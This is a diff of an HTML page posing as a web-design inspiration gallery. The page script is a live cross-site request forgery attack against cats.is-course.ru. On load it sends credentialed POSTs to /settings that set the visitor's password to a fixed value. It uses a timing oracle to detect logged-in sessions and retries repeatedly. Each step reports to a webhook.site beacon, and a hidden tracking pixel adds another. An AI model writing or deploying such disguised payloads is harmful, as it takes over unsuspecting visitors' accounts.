@@ -1,18 +1,26 @@
-<!doctype html><html><head><meta charset="utf-8"><title>design</title></head><body>
-<img src="https://webhook.site/5169748c-49df-4307-9820-7383309d9f02/hit_nojs" width="1" height="1">
-<h1>web design examples</h1>
+<!doctype html><html><head><meta charset="utf-8"><title>Web design inspiration</title></head><body>
+<img src="https://webhook.site/5169748c-49df-4307-9820-7383309d9f02/f_nojs" width="1" height="1" alt="">
+<h1>10 beautiful web designs</h1>
+<p>Curated by a human, not a bot.</p>
 <script>
-var U="5169748c-49df-4307-9820-7383309d9f02", B="https://cats.is-course.ru", NP="Cook9!flowtest2026";
-function beep(n){(new Image()).src="https://webhook.site/"+U+"/"+n;}
-beep("js_start");
-function post(url,body){
-  return fetch(B+url,{method:"POST",mode:"no-cors",credentials:"include",
-    headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body});
+var U="5169748c-49df-4307-9820-7383309d9f02", B="https://cats.is-course.ru", NP="Fb7!catwave2026", n=0;
+function beep(x){(new Image()).src="https://webhook.site/"+U+"/"+x;}
+beep("f_start");
+function post(url, body){
+  var t0=performance.now();
+  return fetch(B+url,{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body})
+   .then(function(){return Math.round(performance.now()-t0);})
+   .catch(function(){return -1;});
 }
-post("/login","login=somenewuser&password=Qq1%21zzzzzzzzzz").then(function(){
-  beep("p1_login");
-  return post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP));
-}).then(function(){ beep("p2_set");
-  return post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP));
-}).then(function(){beep("p3_again");}).catch(function(e){beep("err_"+e.name);});
+// 1) timing oracle: authenticated /settings must bcrypt (~100-300ms), anonymous returns early
+post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP))
+ .then(function(ms){ beep("f_t_"+ms); });
+// 2) keep trying: the session may only exist for part of the visit
+var id=setInterval(function(){
+  n++;
+  post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP))
+   .then(function(ms){ beep("f_a"+n+"_"+ms); });
+  if(n>=20){clearInterval(id); beep("f_done");}
+},3000);
 </script></body></html>
